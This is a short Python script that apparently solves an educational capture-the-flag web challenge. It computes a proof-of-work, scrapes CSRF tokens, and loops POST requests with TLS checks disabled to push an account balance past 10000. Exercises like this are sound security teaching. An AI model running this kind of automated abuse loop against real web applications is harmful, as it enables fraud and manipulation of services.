import requests
import bs4
import hashlib
import sys
import time


def is_valid(digest, zeros, difficulty):
    if sys.version_info.major == 2:
        digest = [ord(i) for i in digest]
    bits = ''.join(bin(i)[2:].zfill(8) for i in digest)
    return bits[:difficulty] == zeros

def proof_of_work(prefix, difficulty):
    zeros = '0' * difficulty
    i = 0
    while True:
        i += 1
        s = prefix + str(i)
        if is_valid(hashlib.sha256(s.encode()).digest(), zeros, difficulty):
            return str(i)

def get(sess, url):
    ret = sess.get(url, verify=False)
    soup = bs4.BeautifulSoup(ret.text, 'html.parser')
    money = int(soup.find('b').string[1:])
    csrf = soup.find_all('input')[1]['value']
    return csrf, money, ret

def post(sess, url, data):
    sess.post(url, data=data, verify=False)

def main():
    sess = requests.Session()

    ret = sess.get('http://eductf.zoolab.org:17385/', verify=False)
    soup = bs4.BeautifulSoup(ret.text, 'html.parser')
    code = soup.find('code').string
    print('code:', code)
    answer = proof_of_work(code, 22)
    print('answer:', answer)

    ret = sess.get('http://eductf.zoolab.org:17385?answer='+answer, verify=False)
    url = ret.url
    count = 0
    while True:
        csrf, money, _ = get(sess, url)
        # print('CSRF:', csrf)
        print(f'Count: {count}, Money: ${money}')
        if money > 10000:
            break
        if money >= 1000:
            post(sess, url, {'plan': 0, 'csrf': csrf})
            count += 1
            time.sleep(6.05)
        else:
            return

    _, _, ret = get(sess, url)
    print(ret.text)
    import IPython;IPython.embed()
    
if __name__ == '__main__':
    while True:
        main()
